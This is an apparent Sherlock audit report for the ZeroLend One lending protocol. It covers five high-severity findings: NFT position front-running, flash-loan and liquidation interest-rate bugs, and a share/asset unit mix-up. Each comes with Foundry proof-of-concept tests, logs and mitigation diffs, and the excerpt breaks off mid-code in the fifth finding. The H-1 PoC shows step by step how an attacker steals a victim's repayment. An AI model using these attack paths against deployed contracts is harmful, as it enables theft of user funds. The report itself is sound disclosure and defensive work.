# Issue H-1: `NFTPositionManager`'s lending functions with `params.tokenId = 0` are vulnerable to front-running 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/59 

## Found by 
000000, A2-security, ZC002, denzi\_, emmac002, iamnmt
### Summary

`NFTPositionManager`'s lending functions do not take a lending pool as an input parameter will cause the users to interact with a malicious pool when setting `params.tokenId = 0` as an attacker will front-run minting a NFT that linked to a malicious pool and then transfer it to the victim.

### Root Cause

`NFTPositionManager`'s lending functions do not take a lending pool as an input parameter.

Although the protocol mitigated the front-run attack vector by implementing an ownership check in every lending function. We believe these mitigation are not enough for the users to use the lending functions with `params.tokenId = 0` safely

```solidity
    if (params.tokenId == 0) {
>>    if (msg.sender != _ownerOf(_nextId - 1)) revert NFTErrorsLib.NotTokenIdOwner();
      params.tokenId = _nextId - 1;
    }
```

https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L46-L49

https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L66-L69

https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L87-L90

https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L107-L110

### Internal pre-conditions

A user uses a `NFTPositionManager` lending function with `params.tokenId = 0`.

### External pre-conditions

_No response_

### Attack Path

The attack vector is viable for every `NFTPositionManager`'s lending functions (`suppy`, `withdraw`, `borrow`, `repay`), here we will demonstrate an attack path for the `repay` function.

1. Alice mints a NFT with `id = 1`, she supplies collateral and borrows `1e18 tokenA`.
2. Alice observes that the last NFT in `NFTPositionManager` is her NFT (the NFT with `id = 1`), so she calls `repay` with `params.tokenId = 0`.
3. The attacker front-run Alice's repay transaction with:
   - Creating a malicious pool that has `tokenA` and a worthless token `attackerToken`.
   - Supplying `1e18 tokenA` directly to the malicious pool.
   - Minting a NFT with `id = 2`, which linked to the malicious pool.
   - Using the NFT with `id = 2` to supply `attackerToken` as collateral, and then borrow `1e18 tokenA`.
   - Tranfering the NFT with `id = 2` to Alice.
4. Alice's repay transaction is executed. She repaid to the NFT with `id = 2` not the NFT with `id = 1`.
5. The attacker withdraws `1e18 tokenA` from the malicious pool and benefits `1e18 tokenA` from Alice.

### Impact

The attacker forced the user to interact with a malicious pool. In case of the `repay` function, the attacker stole all the funds that should be paid to the loan from the user.

### PoC
Run command: `forge test --match-path test/PoC/PoC.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {DataTypes} from 'contracts/core/pool/configuration/DataTypes.sol';
import {IPool} from 'contracts/interfaces/pool/IPool.sol';
import {INFTPositionManager} from 'contracts/interfaces/INFTPositionManager.sol';

import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import {ERC20} from '@openzeppelin/contracts/token/ERC20/ERC20.sol';

import {Test, console} from '../../lib/forge-std/src/Test.sol';
import {DeployNFTPositionManager} from 'test/forge/core/positions/DeployNFTPositionManager.t.sol';

contract AttackerToken is ERC20 {
    constructor() ERC20('XYZ', 'XYZ') {
        _mint(msg.sender, 100 ether);
    }
}

contract PoC is DeployNFTPositionManager {
    address alice = makeAddr('alice');
    address attacker = makeAddr('attacker');

    IPool attackerPool;
    IERC20 attackerToken;

    function setUp() public {
        _setUpPool();
        _setup();

        // The attacker created a malicious pool `attackerPool`
        _setupAttackerPool();
    }

    function _setupAttackerPool() internal {
        address[] memory assets = new address[](2);
        assets[0] = address(tokenA);
        // The attacker created a malicious token `attackerToken`
        vm.prank(attacker);
        attackerToken = new AttackerToken();
        assets[1] = address(attackerToken);

        address[] memory rateStrategyAddresses = new address[](2);
        rateStrategyAddresses[0] = address(irStrategy);
        rateStrategyAddresses[1] = address(irStrategy);

        address[] memory sources = new address[](2);
        sources[0] = address(oracleA);
        sources[1] = address(oracleA);

        DataTypes.InitReserveConfig memory config = _basicConfig();

        DataTypes.InitReserveConfig[] memory configurationLocal = new DataTypes.InitReserveConfig[](2);
        configurationLocal[0] = config;
        configurationLocal[1] = config;

        address[] memory admins = new address[](1);
        admins[0] = attacker;

        DataTypes.InitPoolParams memory p = DataTypes.InitPoolParams({
            proxyAdmin: address(this),
            revokeProxy: false,
            admins: admins,
            emergencyAdmins: new address[](0),
            riskAdmins: new address[](0),
            hook: address(0),
            assets: assets,
            rateStrategyAddresses: rateStrategyAddresses,
            sources: sources,
            configurations: configurationLocal
        });

        poolFactory.createPool(p);
        attackerPool = IPool(address(poolFactory.pools(1)));
    }

    function testPoC() public {
        DataTypes.ExtraData memory dummyData = DataTypes.ExtraData(bytes(''), bytes(''));

        _mintAndApprove(attacker, tokenA, 1 ether, address(attackerPool));
        console.log("Attacker tokenA balance before: %e", tokenA.balanceOf(attacker));

        _mintAndApprove(alice, tokenA, 1 ether, address(nftPositionManager));

        // Alice created a NFT with id = 1 to interact with `pool` (this pool is unmalicious)
        {
            vm.prank(alice);
            nftPositionManager.mint(address(pool));

            // Alice borrowed 1e18 tokenA using the NFT with id = 1
            // For the sake of simplicity, the borrowing code is not implemented
        }

        // The attacker front-ran Alice's repay transaction
        {
            vm.startPrank(attacker);
            attackerPool.supplySimple(address(tokenA), attacker, 1 ether, 0);

            // The attacker created a NFT position with id = 2
            nftPositionManager.mint(address(attackerPool));

            // The attacker supplied `attackerToken` to back the borrowing
            attackerToken.approve(address(nftPositionManager), type(uint256).max);
            INFTPositionManager.AssetOperationParams memory paramsSupply =
            INFTPositionManager.AssetOperationParams(address(attackerToken), address(0), 100 ether, 0, dummyData);
            nftPositionManager.supply(paramsSupply);

            // The attacker borrow tokenA from `attackerPool`
            INFTPositionManager.AssetOperationParams memory paramsBorrow =
            INFTPositionManager.AssetOperationParams(address(tokenA), attacker, 1 ether, 0, dummyData);
            nftPositionManager.borrow(paramsBorrow);

            // The attacker tranfer the NFT with id = 2 to Alice
            nftPositionManager.transferFrom(attacker, alice, 2);
            vm.stopPrank();
        }

        // Alice observed the last NFT is her NFT with id = 1
        // so she repaid to the NFT with id = 0
        // Because of the attack, the last NFT is now the NFT with id = 2
        {
            INFTPositionManager.AssetOperationParams memory paramsRepay =
            INFTPositionManager.AssetOperationParams(address(tokenA), address(0), 1 ether, 0, dummyData);

            vm.prank(alice);
            nftPositionManager.repay(paramsRepay);
        }

        vm.prank(attacker);
        attackerPool.withdrawSimple(address(tokenA), attacker, 1 ether, 0);
        console.log("Attacker tokenA balance after: %e", tokenA.balanceOf(attacker));
    }
}
```

Logs:
```bash
  Attacker tokenA balance before: 1e18
  Attacker tokenA balance after: 2e18
```

### Mitigation

Add a lending pool to the input parameters of `NFTPositionManager`'s lending functions, add check against this lending pool when `params.tokenId == 0`

```solidity
    if (params.tokenId == 0) {
      params.tokenId = _nextId - 1;
      if (msg.sender != _ownerOf(params.tokenId) || _positions[params.tokenId].pool != params.pool) revert NFTErrorsLib.NotTokenIdOwner();
    }
```



## Discussion

**sherlock-admin3**

1 comment(s) were left on this issue during the judging contest.

**Honour** commented:
>  Invalid: see comment on #024



**nevillehuang**

I believe this is valid because pool creation is permisionless

# Issue H-2: Incorrect update of borrow & liquidity interest rates when postprocessing a flash loan 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/101 

## Found by 
000000, 0xAlix2, 0xweebad, A2-security, Tendency, ZC002, coffiasd, dany.armstrong90, denzi\_, dhank, ether\_sky, hyh, iamnmt, lemonmon, stuart\_the\_minion
### Summary

When postprocessing a flash loan, the `FlashLoanLogic` provides wrong loan fee value to the interest rate strategy as a balance update that will cause highly incorrect calculation of liqiduity & borrow rate values.

### Root Cause

In [FlashLoanLogic.sol:L118](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/FlashLoanLogic.sol#L118) `amountPlusPremium` is wrongly provided instead of `_params.totalPremium`.

```solidity
  function _handleFlashLoanRepayment(
    DataTypes.ReserveData storage _reserve,
    DataTypes.ReserveSupplies storage _totalSupplies,
    DataTypes.FlashLoanRepaymentParams memory _params
  ) internal {
    ... ...

    _reserve.updateInterestRates(_totalSupplies, cache, _params.asset, IPool(_params.pool).getReserveFactor(), amountPlusPremium, 0, '', ''); // <-- @audit-issue

    ... ...
  }
```

### Internal pre-conditions

- A reserve should have some debt so that the protocol can update the borrow rate.

### External pre-conditions

_No response_

### Attack Path

A malicious actor just borrows a flash loan to destabilize the ecosystem of a reserve.

### Impact

After a flash loan, the balance change should be just a flash loan fee but the logic provides the entire loan repay as the balance change to update the interest rates.

Therefore excessively out-of-orbit interest rates will severely disrupt the normal deposit and borrowing operations.

### PoC

I added this test case to `PoolFlashLoanTests.t.sol`.
```solidity
  function test_simple_flashloan_underlyingbalance_poc() public {
    bytes memory emptyParams;
    MockFlashLoanSimpleReceiver mockFlashSimpleReceiver = new MockFlashLoanSimpleReceiver(pool);
    _generateFlashloanCondition();

    vm.prank(bob);
    pool.borrowSimple(address(tokenA), bob, 50 ether, 0);

    poolFactory.setFlashloanPremium(2);
    uint256 premium = poolFactory.flashLoanPremiumToProtocol();
    assertEq(premium, 2);

    DataTypes.ReserveSupplies memory reserveSuppliesData = pool.getTotalSupplyRaw(address(tokenA));
    console.log("underlyingBalance Before flash loan: ", reserveSuppliesData.underlyingBalance);
    console.log("Actual Balance Before flash loan: ", tokenA.balanceOf(address(pool)), "\n");

    vm.warp(block.timestamp + 1 hours);

    vm.startPrank(alice);

    vm.expectEmit(true, true, true, true);
    emit PoolEventsLib.FlashLoan(address(mockFlashSimpleReceiver), alice, address(tokenA), 1000 ether, (1000 ether * premium) / 10_000);
    emit Transfer(address(0), address(mockFlashSimpleReceiver), (1000 ether * premium) / 10_000);

    pool.flashLoanSimple(address(mockFlashSimpleReceiver), address(tokenA), 1000 ether, emptyParams);
    vm.stopPrank();

    reserveSuppliesData = pool.getTotalSupplyRaw(address(tokenA));
    console.log("underlyingBalance After flash loan: ", reserveSuppliesData.underlyingBalance);
    console.log("Actual Balance After flash loan: ", tokenA.balanceOf(address(pool)), "\n");

    DataTypes.ReserveData memory reserveData = pool.getReserveData(address(tokenA));
    console.log("Borrow Rate After flash loan: ", reserveData.borrowRate);
    console.log("Liquidity Rate After flash loan: ", reserveData.liquidityRate);
  }
```

Here are the logs after running `forge test --match-test test_simple_flashloan_underlyingbalance_poc -vv`.
```bash
Ran 1 test for test/forge/core/pool/PoolFlashLoanTests.t.sol:PoolFlashLoanTests
[PASS] test_simple_flashloan_underlyingbalance_poc() (gas: 1203761)
Logs:
  underlyingBalance Before flash loan:  1950000000000000000000
  Actual Balance Before flash loan:  1950000000000000000000

  underlyingBalance After flash loan:  2950200000000000000000 // Wrongly exceeded underlyingBalance
  Actual Balance After flash loan:  1950200000000000000000 

  Borrow Rate After flash loan:  3723033495027083612665660 // The correct value should be 7445322453155295630384002
  Liquidity Rate After flash loan:  93066569291342618100614 // The correct value should be 372191834611220613848101
```

### Mitigation

Just replace `amountPlusPremium` with `_params.totalPremium` from the issued line:

```diff
-   _reserve.updateInterestRates(_totalSupplies, cache, _params.asset, IPool(_params.pool).getReserveFactor(), amountPlusPremium, 0, '', '');
+   _reserve.updateInterestRates(_totalSupplies, cache, _params.asset, IPool(_params.pool).getReserveFactor(), _params.totalPremium, 0, '', '');
```

# Issue H-3: A Reserve Borrow Rate can be significantly decreased after liquidation 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/104 

## Found by 
000000, 0xAlix2, 0xc0ffEE, A2-security, BiasedMerc, Honour, JCN, KupiaSec, Nihavent, Obsidian, Tendency, TessKimy, Varun\_05, almurhasan, ether\_sky, jah, lemonmon, perseus, rilwan99, stuart\_the\_minion, trachev, wellbyt3, zarkk01
## Summary

When performing a liquidation, the borrow rate of the reserve is updated by burnt debt shares instead of the remaining debt shares.

Therefore, according to the amount of the burnt shares in a liquidation, the borrow rate can be significantly decreased.

## Vulnerability Detail

In the `LiquidationLogic::executeLiquidationCall()` function, there is a `_repayDebtTokens()` function call to burn covered debt shares through the liquidation.

```solidity
  function executeLiquidationCall(
    mapping(address => DataTypes.ReserveData) storage reservesData,
    mapping(uint256 => address) storage reservesList,
    mapping(address => mapping(bytes32 => DataTypes.PositionBalance)) storage balances,
    mapping(address => DataTypes.ReserveSupplies) storage totalSupplies,
    mapping(bytes32 => DataTypes.UserConfigurationMap) storage usersConfig,
    DataTypes.ExecuteLiquidationCallParams memory params
  ) external {
    ... ...
    _repayDebtTokens(params, vars, balances[params.debtAsset], totalSupplies[params.debtAsset]);
    ... ...
  }
```

In the `_repayDebtTokens()` function, `nextDebtShares` of `debtReserveCache` is updated with burnt shares instead of the remaining debt shares.

```solidity
  function _repayDebtTokens(
    DataTypes.ExecuteLiquidationCallParams memory params,
    LiquidationCallLocalVars memory vars,
    mapping(bytes32 => DataTypes.PositionBalance) storage balances,
    DataTypes.ReserveSupplies storage totalSupplies
  ) internal {
    uint256 burnt = balances[params.position].repayDebt(totalSupplies, vars.actualDebtToLiquidate, vars.debtReserveCache.nextBorrowIndex);
    vars.debtReserveCache.nextDebtShares = burnt; // <-- Wrong here!!!
  }
```

This incorrectly updated `debtReserveCache.nextDebtShares` then is used to update the borrow rate in interest rate strategy.

Consequently, we can have conclusion that the less amount of debt is covered when running a liquidation, the lower the borrow rate gets because next borrow rate depends on the amount of burnt debt shares.

### Proof-Of-Concept

Here is a proof test case:

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

import "../../../../lib/forge-std/src/console.sol";

import './PoolSetup.sol';

import {ReserveConfiguration} from './../../../../contracts/core/pool/configuration/ReserveConfiguration.sol';

import {UserConfiguration} from './../../../../contracts/core/pool/configuration/UserConfiguration.sol';

contract PoolLiquidationTest is PoolSetup {
  using UserConfiguration for DataTypes.UserConfigurationMap;
  using ReserveConfiguration for DataTypes.ReserveConfigurationMap;
  using ReserveConfiguration for DataTypes.ReserveData;

  address alice = address(1);
  address bob = address(2);

  uint256 mintAmountA = 1000 ether;
  uint256 mintAmountB = 2000 ether;
  uint256 supplyAmountA = 550 ether;
  uint256 supplyAmountB = 750 ether;
  uint256 borrowAmountB = 400 ether;

  function setUp() public {
    _setUpPool();
    pos = keccak256(abi.encodePacked(alice, 'index', uint256(0)));
  }

  // @audit-poc
  function testLiquidationDecreaseBorrowRatePoc() external {
    oracleA.updateAnswer(100e8);
    oracleB.updateAnswer(100e8);

    _mintAndApprove(alice, tokenA, mintAmountA, address(pool));
    _mintAndApprove(bob, tokenB, mintAmountB, address(pool));

    vm.startPrank(alice);
    pool.supplySimple(address(tokenA), alice, supplyAmountA, 0);
    vm.stopPrank();

    vm.startPrank(bob);
    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0);
    vm.stopPrank();

    vm.startPrank(alice);
    pool.borrowSimple(address(tokenB), alice, borrowAmountB - 1 ether, 0);
    vm.stopPrank();

    // Advance time to make the position unhealthy
    vm.warp(block.timestamp + 360 days);
    oracleA.updateAnswer(100e8);
    oracleB.updateAnswer(100e8);

    // Expect the position unhealthy
    vm.startPrank(alice);
    vm.expectRevert(bytes('HEALTH_FACTOR_LOWER_THAN_LIQUIDATION_THRESHOLD'));
    pool.borrowSimple(address(tokenB), alice, 1 ether, 0);
    vm.stopPrank();

    // Print log of borrow rate before liquidation
    pool.forceUpdateReserve(address(tokenB));
    DataTypes.ReserveData memory reserveDataB = pool.getReserveData(address(tokenB));
    console.log("reserveDataB.borrowRate before:", reserveDataB.borrowRate);

    vm.startPrank(bob);
    vm.expectEmit(true, true, true, false);
    emit PoolEventsLib.LiquidationCall(address(tokenA), address(tokenB), pos, 0, 0, bob);
    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 0.01 ether);
    vm.stopPrank();

    // Print log of borrow rate after liquidation
    reserveDataB = pool.getReserveData(address(tokenB));
    console.log("reserveDataB.borrowRate after: ", reserveDataB.borrowRate);
  }
}

```

And logs are:
```bash
$ forge test --match-test testLiquidationDecreaseBorrowRatePoc -vvv
[⠒] Compiling...
[⠊] Compiling 11 files with Solc 0.8.19
[⠒] Solc 0.8.19 finished in 5.89s
Compiler run successful!

Ran 1 test for test/forge/core/pool/PoolLiquidationPocTests.t.sol:PoolLiquidationTest
[PASS] testLiquidationDecreaseBorrowRatePoc() (gas: 1205596)
Logs:
  reserveDataB.borrowRate before: 105094339622641509433962264
  reserveDataB.borrowRate after:  4242953968798528786019
```

## Impact

A malicious borrower can manipulate the borrow rate of his any unhealthy positions and repay his debt with signficantly low borrow rate.

## Code Snippet

[pool/logic/LiquidationLogic.sol#L246](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L246)

## Tool used

Manual Review

## Recommendation

Should update the `nextDebtShares` with `totalSupplies.debtShares`:

```diff
  function _repayDebtTokens(
    DataTypes.ExecuteLiquidationCallParams memory params,
    LiquidationCallLocalVars memory vars,
    mapping(bytes32 => DataTypes.PositionBalance) storage balances,
    DataTypes.ReserveSupplies storage totalSupplies
  ) internal {
    uint256 burnt = balances[params.position].repayDebt(totalSupplies, vars.actualDebtToLiquidate, vars.debtReserveCache.nextBorrowIndex);
-   vars.debtReserveCache.nextDebtShares = burnt;
+   vars.debtReserveCache.nextDebtShares = totalSupplies.debtShares;
  }

```

# Issue H-4: Full Liquidation Won't Sweep the Whole Debts With Leaving Some, And Will Wrongly Set Borrowing as False 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/107 

## Found by 
000000, 0xAlix2, 0xc0ffEE, A2-security, Bigsam, Honour, JCN, KupiaSec, Nihavent, Obsidian, TessKimy, Varun\_05, almurhasan, coffiasd, dany.armstrong90, dhank, ether\_sky, iamnmt, silver\_eth, stuart\_the\_minion, trachev, zarkk01
# Full Liquidation Won't Sweep the Whole Debts With Leaving Some, And Will Wrongly Set Borrowing as False

## Summary

When a liquidator tries to full liquidation (to cover full debts), there will leave some uncovered debts and the liquidation will wrongly set borrowing status of the debt asset as false.

## Vulnerability Detail

According to the [comment](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/interfaces/pool/IPoolSetters.sol#L143-L144) in `IPoolSetters.sol`, `debtToCover` parameter of the `liquidate()` function is intended to be debt assets, not shares.

> The caller (liquidator) covers `debtToCover` amount of debt of the user getting liquidated, and receives a proportionally amount of the `collateralAsset` plus a bonus to cover market risk

But the `_calculateDebt` function call in the `executeLiquidationCall()` do the operations on debt shares to calculate debt amount to cover and collateral amount to buy.

```solidity
  function _calculateDebt(
    DataTypes.ExecuteLiquidationCallParams memory params,
    uint256 healthFactor,
    mapping(address => mapping(bytes32 => DataTypes.PositionBalance)) storage balances
  ) internal view returns (uint256, uint256) {
    uint256 userDebt = balances[params.debtAsset][params.position].debtShares;

    uint256 closeFactor = healthFactor > CLOSE_FACTOR_HF_THRESHOLD ? DEFAULT_LIQUIDATION_CLOSE_FACTOR : MAX_LIQUIDATION_CLOSE_FACTOR;

    uint256 maxLiquidatableDebt = userDebt.percentMul(closeFactor);

    uint256 actualDebtToLiquidate = params.debtToCover > maxLiquidatableDebt ? maxLiquidatableDebt : params.debtToCover;

    return (userDebt, actualDebtToLiquidate);
  }
```

According to this function, the return values `userDebt` and `actualDebtToLiquidate` are debt shares because they are not multiplied by borrow index.

Meanwhile, on the collateral reserve side, the `vars.userCollateralBalance` value that is provided as collateral balance to the `_calculateAvailableCollateralToLiquidate()` function, is collateral shares not assets. ([pool/logic/LiquidationLogic.sol#L136-L148](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L136-L148))

```solidity
    vars.userCollateralBalance = balances[params.collateralAsset][params.position].supplyShares;

    (vars.actualCollateralToLiquidate, vars.actualDebtToLiquidate, vars.liquidationProtocolFeeAmount) =
      _calculateAvailableCollateralToLiquidate(
        collateralReserve,
        vars.debtReserveCache,
        vars.actualDebtToLiquidate,
        vars.userCollateralBalance, // @audit-info Supply shares not assets
        vars.liquidationBonus,
        IPool(params.pool).getAssetPrice(params.collateralAsset),
        IPool(params.pool).getAssetPrice(params.debtAsset),
        IPool(params.pool).factory().liquidationProtocolFeePercentage()
      );
```

As there is no shares-to-assets conversion in the `_calculateAvailableCollateralToLiquidate()` function, the return values of the function `vars.actualCollateralToLiquidate`, `vars.actualDebtToLiquidate`, `vars.liquidationProtocolFeeAmount` are shares.

The remaining liquidation flow totally treat these share values as asset amounts. e.g. `_repayDebtTokens()` function calls the `repayDebt` function whose input is supposed to be assets:

```solidity
  function _repayDebtTokens( ... ) internal {
    uint256 burnt = balances[params.position].repayDebt(totalSupplies, vars.actualDebtToLiquidate, vars.debtReserveCache.nextBorrowIndex); // <-- @audit `vars.actualDebtToLiquidate` is shares at this moment
    vars.debtReserveCache.nextDebtShares = burnt;
  }
```

Thus, when a liquidator tries to cover full debts, the liquidation will leave `((borrowIndex - 1) / borrowIndex) * debtShares` debt shares and will set the borrowing status of the debt asset as false via the following [code snippet](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L150-L152).

```solidity
  function executeLiquidationCall(...) external {
    ... ...
    if (vars.userDebt == vars.actualDebtToLiquidate) {
      userConfig.setBorrowing(debtReserve.id, false);
    }
    ... ...
  }
```

### Proof-Of-Concept

To make a test case simple, I simplified the oracle price feeds like the below in the `CorePoolTests.sol` file:

```diff
  function _setUpCorePool() internal {
    ... ...
    oracleA = new MockV3Aggregator(8, 1e8);
-   oracleB = new MockV3Aggregator(18, 2 * 1e8);
+   oracleB = new MockV3Aggregator(8, 1e8);
    ... ...
  }
```

And created a new test file `PoolLiquidationTest2.sol`:

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

import "../../../../lib/forge-std/src/console.sol";

import './PoolSetup.sol';

import {ReserveConfiguration} from './../../../../contracts/core/pool/configuration/ReserveConfiguration.sol';

import {UserConfiguration} from './../../../../contracts/core/pool/configuration/UserConfiguration.sol';

contract PoolLiquidationTest2 is PoolSetup {
  using UserConfiguration for DataTypes.UserConfigurationMap;
  using ReserveConfiguration for DataTypes.ReserveConfigurationMap;
  using ReserveConfiguration for DataTypes.ReserveData;

  address alice = address(1);
  address bob = address(2);

  uint256 mintAmountA = 200 ether;
  uint256 mintAmountB = 200 ether;
  uint256 supplyAmountA = 60 ether;
  uint256 supplyAmountB = 60 ether;
  uint256 borrowAmountB = 45 ether;

  function setUp() public {
    _setUpPool();
    pos = keccak256(abi.encodePacked(alice, 'index', uint256(0)));
  }

  // @audit-poc
  function testLiquidationInvalidUnits() external {
    oracleA.updateAnswer(1e8);
    oracleB.updateAnswer(1e8);

    _mintAndApprove(alice, tokenA, mintAmountA, address(pool));
    _mintAndApprove(bob, tokenB, mintAmountB, address(pool));

    vm.startPrank(alice);
    pool.supplySimple(address(tokenA), alice, supplyAmountA, 0);
    vm.stopPrank();

    vm.startPrank(bob);
    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0);
    vm.stopPrank();

    vm.startPrank(alice);
    pool.borrowSimple(address(tokenB), alice, borrowAmountB, 0);
    vm.stopPrank();

    // Advance time to make the position unhealthy
    vm.warp(block.timestamp + 360 days);
    oracleA.updateAnswer(1e8);
    oracleB.updateAnswer(1e8);

    // Print log of borrow rate before liquidation
    pool.forceUpdateReserve(address(tokenB));
    DataTypes.ReserveData memory reserveDataB = pool.getReserveData(address(tokenB));
    console.log("reserveDataB.borrowIndex before Liq.", reserveDataB.borrowIndex);

    DataTypes.PositionBalance memory positionBalance = pool.getBalanceRawByPositionId(address(tokenB), pos);
    console.log('debtShares Before Liq.', positionBalance.debtShares);

    DataTypes.UserConfigurationMap memory userConfig = pool.getUserConfiguration(alice, 0);
    console.log('TokenB isBorrowing Before Liq.', UserConfiguration.isBorrowing(userConfig, reserveDataB.id));

    vm.startPrank(bob);
    vm.expectEmit(true, true, true, false);
    emit PoolEventsLib.LiquidationCall(address(tokenA), address(tokenB), pos, 0, 0, bob);
    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 100 ether); // @audit Tries to cover full debts
    vm.stopPrank();

    positionBalance = pool.getBalanceRawByPositionId(address(tokenB), pos);
    console.log('debtShares After Liq.', positionBalance.debtShares);

    userConfig = pool.getUserConfiguration(alice, 0);
    console.log('TokenB isBorrowing After Liq.', UserConfiguration.isBorrowing(userConfig, reserveDataB.id));
  }
}
```
And here are the logs:
```bash
$ forge test --match-test testLiquidationInvalidUnits -vvv
[⠒] Compiling...
[⠊] Compiling 1 files with Solc 0.8.19
[⠒] Solc 0.8.19 finished in 4.83s
Compiler run successful!

Ran 1 test for test/forge/core/pool/PoolLiquidationPocTests2.t.sol:PoolLiquidationTest2
[PASS] testLiquidationInvalidUnits() (gas: 1172963)
Logs:
  reserveDataB.borrowIndex before Liq. 1252660064369089319656921640
  debtShares Before Liq. 45000000000000000000
  TokenB isBorrowing Before Liq. true
  debtShares After Liq. 9076447170314674990
  TokenB isBorrowing After Liq. false
```

As can be seen from the logs, there are significant amount of debts left but the borrowing flag was set as false.

## Impact

Wrongly setting borrowing status as false will affect the calculation of total debt amount, LTV and health factor, and this incorrect calculation will affect the whole ecosystem of a pool.

## Code Snippet

[pool/logic/LiquidationLogic.sol#L136](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L136)

[pool/logic/LiquidationLogic.sol#L264](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L264)

## Tool used

Manual Review

## Recommendation

Update the issued lines in the `LiquidationLogic.sol` file:

```diff
  function executeLiquidationCall(
    ... ...
  ) external {
    ... ...
-   vars.userCollateralBalance = balances[params.collateralAsset][params.position].supplyShares;
+   vars.userCollateralBalance = balances[params.collateralAsset][params.position].getSupplyBalance(collateralReserve.liquidityIndex);
    ... ...
  }

  function _calculateDebt(
    ... ...
  ) internal view returns (uint256, uint256) {
-   uint256 userDebt = balances[params.debtAsset][params.position].debtShares;
+   uint256 userDebt = balances[params.debtAsset][params.position].getDebtBalance(borrowIndex);
  }
```

I tried the above POC testcase to the update and the logs are:

```bash
$ forge test --match-test testLiquidationInvalidUnits -vv
[⠒] Compiling...
[⠊] Compiling 7 files with Solc 0.8.19
[⠒] Solc 0.8.19 finished in 5.90s
Compiler run successful!

Ran 1 test for test/forge/core/pool/PoolLiquidationPocTests2.t.sol:PoolLiquidationTest2
[PASS] testLiquidationInvalidUnits() (gas: 1137920)
Logs:
  reserveDataB.borrowIndex before Liq. 1252660064369089319656921640
  debtShares Before Liq. 45000000000000000000
  TokenB isBorrowing Before Liq. true
  debtShares After Liq. 0
  TokenB isBorrowing After Liq. false
```

# Issue H-5: `LiquidationLogic@_burnCollateralTokens` does not account for liquidation fees when withdrawing collateral during liquidation leading to incorrect accounting and Pools insolvency 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/228 

## Found by 
000000, A2-security, Bigsam, Honour, dany.armstrong90, dhank, ether\_sky, imsrybr0, lemonmon, thisvishalsingh, trachev, zarkk01
### Summary

`LiquidationLogic@_burnCollateralTokens` does not account for liquidation fees when withdrawing collateral during liquidation leading to incorrect accounting and Pools insolvency, ultimately impacting regular flows (.e.g borrows, withdrawals, redemptions, ...) in the protocol for the different actors (.i.e Pools users, Curated Vaults and their users, NFT Positions users).

### Root Cause

[LiquidationLogic](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol)
```solidity
// ...
library LiquidationLogic {
  // ...
  function executeLiquidationCall(
    mapping(address => DataTypes.ReserveData) storage reservesData,
    mapping(uint256 => address) storage reservesList,
    mapping(address => mapping(bytes32 => DataTypes.PositionBalance)) storage balances,
    mapping(address => DataTypes.ReserveSupplies) storage totalSupplies,
    mapping(bytes32 => DataTypes.UserConfigurationMap) storage usersConfig,
    DataTypes.ExecuteLiquidationCallParams memory params
  ) external {
    // ...

    (vars.actualCollateralToLiquidate, vars.actualDebtToLiquidate, vars.liquidationProtocolFeeAmount) = // <==== Audit 
    _calculateAvailableCollateralToLiquidate(
      collateralReserve,
      vars.debtReserveCache,
      vars.actualDebtToLiquidate,
      vars.userCollateralBalance,
      vars.liquidationBonus,
      IPool(params.pool).getAssetPrice(params.collateralAsset),
      IPool(params.pool).getAssetPrice(params.debtAsset),
      IPool(params.pool).factory().liquidationProtocolFeePercentage()
    );

    // ...

    _burnCollateralTokens(
      collateralReserve, params, vars, balances[params.collateralAsset][params.position], totalSupplies[params.collateralAsset]
    ); // <==== Audit

    if (vars.liquidationProtocolFeeAmount != 0) {
      // ...

      IERC20(params.collateralAsset).safeTransfer(IPool(params.pool).factory().treasury(), vars.liquidationProtocolFeeAmount);  // <==== Audit
    }

    // ...
  }

   function _burnCollateralTokens(
    DataTypes.ReserveData storage collateralReserve,
    DataTypes.ExecuteLiquidationCallParams memory params,
    LiquidationCallLocalVars memory vars,
    DataTypes.PositionBalance storage balances,
    DataTypes.ReserveSupplies storage totalSupplies
  ) internal {
    // ...
    balances.withdrawCollateral(totalSupplies, vars.actualCollateralToLiquidate, collateralReserveCache.nextLiquidityIndex); // <==== Audit : actualCollateralToLiquidate doesn't include liquidation fees
